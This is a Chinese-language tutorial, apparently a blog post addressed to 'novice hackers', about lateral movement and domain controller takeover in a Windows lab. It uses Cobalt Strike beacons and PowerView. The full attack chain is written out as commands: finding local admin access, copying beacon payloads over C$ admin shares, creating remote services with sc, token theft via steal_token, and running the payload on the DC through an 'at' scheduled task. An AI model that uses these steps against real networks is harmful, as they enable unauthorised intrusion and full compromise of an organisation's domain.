欢迎回来，我的新手黑客

今天给大家分享的是当我们在内网中获得了一个立足点的时候如何进行横向的渗透，以当前的主机为跳板进行横向渗透



需要值得注意的是今天实验的环境：实验环境为一台域控制器，两台Windows，我们在内网中获得立足点的主机上的用户属于另一台Windows设备上的管理员组

在CS中看到上线主机的用户名为ademo，接下来我们来看一下是否满足该用户在另一台设备上属于管理员组，使用以下命令查看

net localgroup Administrators

从图片中我们知道了以上环境满足我们的要求



马上进入我们的教程


使用命令确认一下当前所处的环境

net view

可以看到我们当前域内共有三台设备，其中一台DC为域控制器



Step1：我们以攻击者的角度来看一下环境是否满足要求，我们快速检查一下，使用PowerView脚本进行检查，该脚本可以从网上获取，或者在公众号后台回复PowerView

powershell-import PowerView.ps1

加载完脚本之后进行查找

powershell Find-LocalAdminAccess

我们可以看到ademo用户是xpcomputer设备上的管理员,我们尝试一些需要管理员才可以执行的命令，比如查看该设备上的C盘共享文件，该文件为默认共享

shell dir \\XPCOMPUTER\C$

从图片中我们可以看到查看到了xpcomputer设备C盘上的文件，完成这一步确保我们权限正常



Step2：接下来我们准备横向渗透xpcomputer这一台设备，我们需要生成一个服务类型的exe，准备以服务为突破口进行横向渗透

创建一个smb类型的监听器，因为smb类型的监听器就是为了横向渗透而生，创建的方式和之前一样

创建完成之后，我们生成一个攻击载荷，该攻击载荷为服务类型的exe

选择相对应的菜单，点击Windows Executable

选择相对应的参数的，点击Generate，将文件存放在Documents文件夹中并将其命令为beacon.exe

接下来我们将文件上传到已经上线这台主机上设备上，此处上传的路径为c:\windows\temp，使用命令upload，并选择相对应的文件

upload

此处的路径注意我们需要拥有写权限，我们先将当前的工作路径切换到c:\windows\temp下面，在进行上传

cd c:\windows\temppwdupload

确保上传成功之后，接下来我们需要将该文件复制到xpcomputer设备上，使用以下命令

shell copy beacon.exe \\XPCOMPUTER\C$\windows\temp

根据图片看到一个文件已拷贝，这样子我们就做好了前期的准备工作



Step3：我们为刚才生成的beacon创建一个服务，使用以下命令创建服务

shell sc \\XPCOMPUTER create beaconservice binpath= c:\windows\temp\beacon.exe

需要注意的是binpath=和c之间有一个空格，如果没有这个空格的话会报错

创建服务成功之后，我们启动该服务

shell sc \\XPCOMPUTER start beaconservice

启动服务成功，接下来连接到xpcomputer这台设备上

link XPCOMPUTER

我们切换视图看一下

这样子我们就拿到了xpcomputer设备上的SYSTEM权限



Step4：这个时候我们尝试获取域控制器的权限，如果在YU-PC设备上用户拥有对域控制器的管理员权限，那么我们可以直接以YU-PC作为突破口，如果没有的话，我们以刚才横向拓展的xpcomputer作为突破口


来到xpcomputer的beacon对话框，我们来查看一下当前的用户身份

getuid

我们查看是否有进程以Administrator身份运行

ps

我们看到了比较感兴趣的内容

接下来我们使用steal_token窃取该进程的标记，成为假冒的管理员Administrator，该身份只在跟远端系统进行交互的时候生效，因为我们在xpcomputer本地的身份还是SYSTEM

 steal_token 504

我们可以使用命令来查看

getuid

接下来我们尝试查看域控制器上面的默认共享文件

shell dir \\DC\C$

很好，我们拥有对应的权限



接下来我们回到YU-PC的beacon会话来


使用CS生成攻击载荷

选择相对应的菜单，选择Windows Executable(s)

选择相对应的选项，注意Stage选择之前创建的smb类型的监听器

将文件保存到本地命名为dc

我们完成了前期工作的第一步，生成攻击载荷



Step5：切换到xpcomputer的beacon对话框，我们将刚才生成的攻击载荷上传到xpcomputers设备上，路径为c:\windows\temp

cd c:\windows\temppwdupload

上传成功后我们将文件复制到DC域控制器上，因为当前用户与远端设备DC交互时身份为Administrator，所以具有相对应的权限，可以操作文件

shell copy dc.exe \\DC\C$\windows\temp

做好前提工作之后，准备进行横向渗透拿下DC服务器的权限



Step6：我们使用at计划任务时DC运行生成的攻击载荷，使用一下命令先确认试一下DC域控制器上面当前时间

net time \\DC\C$

确定当前时间，我们开始设置计划任务

shell at \\DC 17:30 c:\windows\temp\dc.exe

设置成功，我们来看一下当前DC设备上面的计划任务列表

shell at \\DC

看到了刚才我们设置的计划任务，再来确认一下DC的时间

还未执行计划任务，再等待一下

这个时候我们来连接到DC

link DC

连接成功，换一个视图查看

这样子我们就拿下了域控制器DC的控制权
